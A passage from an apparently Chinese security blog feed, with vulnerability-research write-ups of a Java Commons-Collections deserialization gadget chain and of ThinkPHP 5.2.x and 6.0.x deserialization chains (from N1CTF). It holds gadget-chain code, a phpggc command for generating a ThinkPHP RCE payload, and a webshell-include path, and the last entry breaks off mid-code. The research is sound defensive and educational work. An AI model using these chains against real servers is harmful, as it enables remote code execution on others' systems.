class="line">         <span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;, <span class="title">execArgs</span>),</span></span><br><span class="line"><span class="class">      <span class="title">new</span> <span class="title">ConstantTransformer</span>(1) &#125;</span>;</span><br></pre></td></tr></table></figure><p>链的第一个结点选用的是<code>ConstantTransformer</code>，其transformer直接返回构造时的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;<span class="comment">// 此时iConstant置为Runtime.class</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;<span class="comment">// 直接返回Runtime.class</span></span><br><span class="line">  <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终的调用，类似</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Object obj = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Class cls = obj.getClass();</span><br><span class="line">Method method;</span><br><span class="line">method = cls.getMethod("getMethod",new Class[] &#123;String.class, Class[].class &#125;);</span><br><span class="line">obj = method.invoke(obj, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;);</span><br><span class="line">cls = obj.getClass();</span><br><span class="line">method = cls.getMethod("invoke",new Class[] &#123;Object.class, Object[].class &#125;);</span><br><span class="line">obj = method.invoke(obj, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;);</span><br><span class="line">cls = obj.getClass();</span><br><span class="line">method = cls.getMethod(<span class="string">"exec"</span>,<span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;)</span>;</span><br><span class="line">method.invoke(obj, <span class="keyword">new</span> String[] &#123; <span class="string">"open /System/Applications/Calculator.app"</span> &#125;);</span><br></pre></td></tr></table></figure><p>接下来的问题是如何触发<code>ChainedTransformer</code>？搜索一下调用transform的位置，排除掉xxxTransformer类，最有可能被利用的就是<code>LazyMap.get</code>、<code>TransformedMap.checkSetValue</code>，其中checkSetValue会在setValue函数被调用的时候调用。</p><p>接下来就是找能触发上面两个利用方式的方法。</p><p>同样的，前面基础知识提到，如果一个对象的readObject函数被重载了，会优先调用重载后的readObject函数。</p><p>我们最好能在被重载的readObject函数中发现相关可控Map数据的操作(get和setValue)。</p><p>而exp中<code>sun.reflect.annotation.AnnotationInvocationHandler</code>非常符合上述的描述。</p><p>来看一下这个类的readObject实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">  s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">  AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    annotationType = AnnotationType.getInstance(type);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">  <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">  <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">    String name = memberValue.getKey();</span><br><span class="line">    Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">    <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">      Object value = memberValue.getValue();</span><br><span class="line">      <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">            value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        memberValue.setValue(</span><br><span class="line">          <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">            value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">            annotationType.members().get(name)));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在第26行处，调用了memberValue.setValue，这里的memberValue我们可以将其置为构造好的TransformedMap实例。</p><p>在这个TransformedMap实例上，valueTransformer属性被置为前文的ChainedTransformer。这样这个链就串起来了，总结一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sun.reflect.annotation.AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt; memberValue.setValue() =&gt; TransformedMap.setValue() =&gt; TransformedMap.checkSetValue()</span><br><span class="line">  -&gt; valueTransformer.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">  -&gt; 前文构造的Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>第二种，利用LazyMap.get()</p><p>CommonsCollections1中利用了AnnotationInvocationHandler.invoke函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">    String member = method.getName();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"toString"</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"hashCode"</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"annotationType"</span>:</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    Object result = memberValues.get(member);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第15行调用了memberValues.get函数，这里如果memberValues设置为构造好的LazyMap实例，将触发该利用链的执行。</p><p>那么怎么来调用invoke函数呢？这里用到了Proxy动态代理机制。在该机制下被代理的实例不管调用什么类方法，都会先调用invoke函数。</p><p>那么我们利用Proxy动态代理AnnotationInvocationHandler，并将memberValues设置为LazyMap。在AnnotationInvocationHandler.readObject函数里，第19行调用了memberValues.entrySet函数。在动态代理下会先调用invoke函数，且此时的函数名entrySet不在toString、hashCode、annotationType里，那么会最终走到第15行的位置。总结一下这个调用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sun.reflect.annotation.AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt; memberValues.entrySet()</span><br><span class="line">  -&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">  -&gt; memberValues.get() =&gt; LazyMap.get()</span><br><span class="line">  -&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">  -&gt; 前文构造的Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>这也是ysoserial的CommonsCollections1的调用链。</p><p>后续的利用链分析放在下一篇文章里。</p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>经过对ysoserial工具生成的反序列化利用链的调试，熟悉了Java的反序列化的一个流程。但对于exp的书写仍然有待提高。</p><p>需要注意的是，CommonCollections1和3用的override.class作为Annotation在jdk8上是不适用的，要调试这两个payload需要用jdk7，<a href="!http://www.thegreycorner.com/2016/05/commoncollections-deserialization.html">参考</a></p><p>除此之外，在调试过程中，体会到了javassist库的强大，修改jar包里的class文件非常舒服！</p><p>Proxy的动态代理机制，Java的反射机制相信会是后续学习的一个重点，继续💪！</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp v5.2.x 反序列化利用链挖掘</title>
      <link href="2019/09/10/php-thinkphp-5-2-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>2019/09/10/php-thinkphp-5-2-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>上周参与了N1CTF，里面有一道关于thinkphp5的反序列化漏洞的利用。记录一下关于该反序列化的利用链分析。<br><a id="more"></a></p><p>后文主要包括两条链的利用分析（一条是我找的，也是题目的预期解，另一条是wonderkun师傅找的非预期解）</p><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>这里就不直接用题目的环境了，采用composer直接安装5.2.*-dev版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.2.x-dev v5.2</span><br></pre></td></tr></table></figure><h1 id="0x02-利用链分析"><a href="#0x02-利用链分析" class="headerlink" title="0x02 利用链分析"></a>0x02 利用链分析</h1><h2 id="背景回顾"><a href="#背景回顾" class="headerlink" title="背景回顾"></a>背景回顾</h2><p>tp5在我印象里反序列化的利用链存在一个Windows类的任意文件删除，但是在<a href="[https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/](https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/">这篇文章</a>)的启示下，也算是找到了一条新的路（关于<code>__toString</code>的触发方式，除了字符串拼接的方式，还可以利用PHP自带函数参数的强制转换）。</p><p>这篇文章的利用链最后用到了5.1.37版本<code>think/Request.php</code>的 <code>__call</code>函数，该函数的调用函数名可控，所以可以导致任意调用其他的类函数。而在5.2.x版本不存在这样的一个<code>__call</code>函数，这意味着我们需要重新找一个最终达成命令执行的函数调用（<code>__call</code>函数前的利用链仍然可用）。</p><p>那么接下来，我们来看看5.2.x新的利用链吧：）</p><h2 id="think-model-concern-Attribute-php-getValue可函数动态调用函数（题目的预期解）"><a href="#think-model-concern-Attribute-php-getValue可函数动态调用函数（题目的预期解）" class="headerlink" title="think/model/concern/Attribute.php getValue可函数动态调用函数（题目的预期解）"></a>think/model/concern/Attribute.php getValue可函数动态调用函数（题目的预期解）</h2><p>由于5.1.37<code>__call</code>函数前的利用链仍然存在于5.2.x版本，这里就不再详述了。</p><p>先来看一下Conversion类的toArray函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 合并关联数据</span></span><br><span class="line">    $data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">            $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);<span class="comment">// relation和visible存在同一个key就行</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>去掉了无关的代码，这里<code>$this-&gt;visible</code>、<code>$this-&gt;relation</code>均可控，可伪造数据进入<code>getAttr</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 检测属性获取器</span></span><br><span class="line">  $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);<span class="comment">// 直接返回$name的值</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName]; <span class="comment">// withAttr内容可控</span></span><br><span class="line">    $value   = $closure($value, <span class="keyword">$this</span>-&gt;data); <span class="comment">// 动态调用函数</span></span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>直接关注<code>getValue</code>函数，该函数可动态调用函数，并且调用函数、函数参数均可控。所以接下来有两种方法，第一种是找一个符合条件的php函数，另一种是利用tp自带的SerializableClosure调用，来看一下第二种。</p><p><a href="https://github.com/opis/closure" target="_blank" rel="noopener">\Opis\Closure</a>可用于序列化匿名函数，使得匿名函数同样可以进行序列化操作。这意味着我们可以序列化一个匿名函数，然后交由上述的<code>$closure($value, $this-&gt;data)</code>调用执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$func = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;phpinfo();&#125;;</span><br><span class="line">$closure = <span class="keyword">new</span> \Opis\Closure\SerializableClosure($func);</span><br><span class="line">$closure($value, <span class="keyword">$this</span>-&gt;data);<span class="comment">// 这里的参数可以不用管</span></span><br></pre></td></tr></table></figure><p>以上述代码为例，将调用phpinfo函数。</p><p>到此为止，我们分析完了整一个调用流程，回顾一下</p><ol><li><code>vendor/topthink/framework/src/think/process/pipes/Windows.php</code><br>  <code>__destruct</code> -&gt;<code>removeFiles</code> -&gt;<code>file_exists</code> 强制转化字符串<code>filename</code>，这里的<code>filename</code>可控<br> 可触发<code>__toString</code>函数，下一步找可利用的<code>__toString</code></li><li><code>vendor/topthink/framework/src/think/model/concern/Conversion.php</code><br> <code>__toString</code> -&gt; <code>toJson</code> -&gt; <code>toArray</code>创造符合条件的<code>relation</code>和<code>visible</code>-&gt; <code>getAttr</code><br> 下一步调用<code>vendor/topthink/framework/src/think/model/concern/Attribute.php</code>的<code>getValue</code>函数</li><li><code>vendor/topthink/framework/src/think/model/concern/Attribute.php</code><br><code>getValue</code> -&gt; <code>$closure</code>动态调用函数，且该内容可控<br>下一步利用有两种，一种找符合的php函数，另一种利用tp自带的<code>SerializableClosure</code>调用</li><li><code>vendor/opis/closure/src/SerializableClosure.php</code><br>构造可利用的匿名函数</li></ol><p>我把exp集成到了<a href="https://github.com/wh1t3p1g/phpggc" target="_blank" rel="noopener">phpggc</a>上，使用如下命令即可生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -u ThinkPHP/RCE1 <span class="string">'phpinfo();'</span></span><br></pre></td></tr></table></figure><p>这里由于用到了SerializableClosure，需要使用编码器编码，不可直接输出拷贝利用。</p><h2 id="think-Db-php-call函数可实例化任意类（题目的非预期解）"><a href="#think-Db-php-call函数可实例化任意类（题目的非预期解）" class="headerlink" title="think/Db.php __call函数可实例化任意类（题目的非预期解）"></a>think/Db.php __call函数可实例化任意类（题目的非预期解）</h2><p>前面说到5.1.37版本的利用链的<code>__call</code>函数，在5.2.x版本没办法用了。但是从<code>__destruct</code>到<code>__call</code>的链路是通的，我们只需要重新找一个可用的<code>__call</code>函数即可。</p><p>来看一下<code>vendor/topthink/framework/src/think/Db.php</code>的<code>__call</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $class = <span class="keyword">$this</span>-&gt;config[<span class="string">'query'</span>];</span><br><span class="line"></span><br><span class="line">    $query = <span class="keyword">new</span> $class(<span class="keyword">$this</span>-&gt;connection);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> call_user_func_array([$query, $method], $args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;config</code>和<code>$this-&gt;connection</code>均可控，这意味着我们可以实例化任意符合条件的类，这里找了<code>think\Url</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(App $app, array $config = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;app    = $app;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_file($app-&gt;getRuntimePath() . <span class="string">'route.php'</span>)) &#123;</span><br><span class="line">        <span class="comment">// 读取路由映射文件</span></span><br><span class="line">        $app-&gt;route-&gt;import(<span class="keyword">include</span> $app-&gt;getRuntimePath() . <span class="string">'route.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该构造器引入了RuntimePath下的route.php文件，因为这道题是允许上传文件的，所以只要在可上传的目录下上传一个route.php的webshell即可。至于RuntimePath，<code>$app</code>为可控变量，直接修改<code>$runtimePath</code>的内容即可。</p><p>我们直接构造App对象为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $runtimePath;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $rootPath = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rootPath = $rootPath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;runtimePath = <span class="string">"/tmp/"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;route = <span class="keyword">new</span> \think\route\RuleName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个构造思路太溜了，膜一波：）</p><p>整理一下过程</p><ol><li><code>vendor/topthink/framework/src/think/process/pipes/Windows.php</code><br><code>__destruct</code> -&gt;<code>removeFiles</code> -&gt;<code>file_exists</code> 强制转化字符串<code>filename</code>，这里的<code>filename</code>可控<br>可触发<code>__toString</code>函数，下一步找可利用的<code>__toString</code></li><li><code>vendor/topthink/framework/src/think/model/concern/Conversion.php</code><br><code>__toString</code> -&gt; <code>toJson</code> -&gt; <code>toArray</code>-&gt;<code>appendAttrToArray</code>-&gt;<code>$relation</code>调用不存在的函数，触发<code>__call</code></li><li><code>vendor/topthink/framework/src/think/Db.php</code><br><code>__call</code> -&gt; <code>new $class($this-&gt;connection)</code> 调用任意类的<code>__construct</code>函数</li><li><code>vendor/topthink/framework/src/think/Url.php</code><br>构造App类，达到<code>include</code>任意文件的效果</li></ol>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp v6.0.x 反序列化利用链挖掘</title>
      <link href="2019/09/10/php-thinkphp-6-0-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>2019/09/10/php-thinkphp-6-0-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>上一篇分析了tp 5.2.x的反序列化利用链挖掘，顺着思路，把tp6.0.x也挖了。有类似的地方，也有需要重新挖掘的地方。<br><a id="more"></a></p><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>采用composer安装6.0.*-dev版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=6.0.x-dev v6.0</span><br></pre></td></tr></table></figure><h1 id="0x02-利用链分析"><a href="#0x02-利用链分析" class="headerlink" title="0x02 利用链分析"></a>0x02 利用链分析</h1><h2 id="背景回顾"><a href="#背景回顾" class="headerlink" title="背景回顾"></a>背景回顾</h2><p>拿到v6.0.x版本，简单的看了一下，有一个好消息和一个坏消息。</p><p>好消息是5.2.x版本函数动态调用的反序列化链后半部分，还可以利用。</p><p>坏消息是前面5.1.x，5.2.x版本都基于触发点<code>Windows</code>类的<code>__destruct</code>,好巧不巧的是6.0.x版本取消了<code>Windows</code>类。这意味着我们得重新找一个合适的起始触发点，才能继续使用上面的好消息。</p><h2 id="vendor-topthink-think-orm-src-Model-php-新起始触发点"><a href="#vendor-topthink-think-orm-src-Model-php-新起始触发点" class="headerlink" title="vendor/topthink/think-orm/src/Model.php 新起始触发点"></a>vendor/topthink/think-orm/src/Model.php 新起始触发点</h2><p>为了节省篇幅，后文不再重复介绍触发<code>__toString</code>函数后的利用链，这部分同5.2.x版本相同(不过wonderkun师傅的利用链已失效，动态函数调用的利用链还能用)。</p><p>通常最好的反序列化起始点为<code>__destruct</code>、<code>__wakeup</code>，因为这两个函数的调用在反序列化过程中都会自动调用，所以我们先来找此类函数。这里我找了<code>vendor/topthink/think-orm/src/Model.php</code>的<code>__destruct</code>函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;<span class="comment">// 构造lazySave为true，进入save函数</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $data = [], string $sequence = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先构造<code>lazySave</code>的值为<code>true</code>,从而进入<code>save</code>函数。</p><p>这次触发点位于<code>updateData</code>函数内，为了防止前面的条件符合，而直接return，我们首先需要构造相关参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(string $event)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 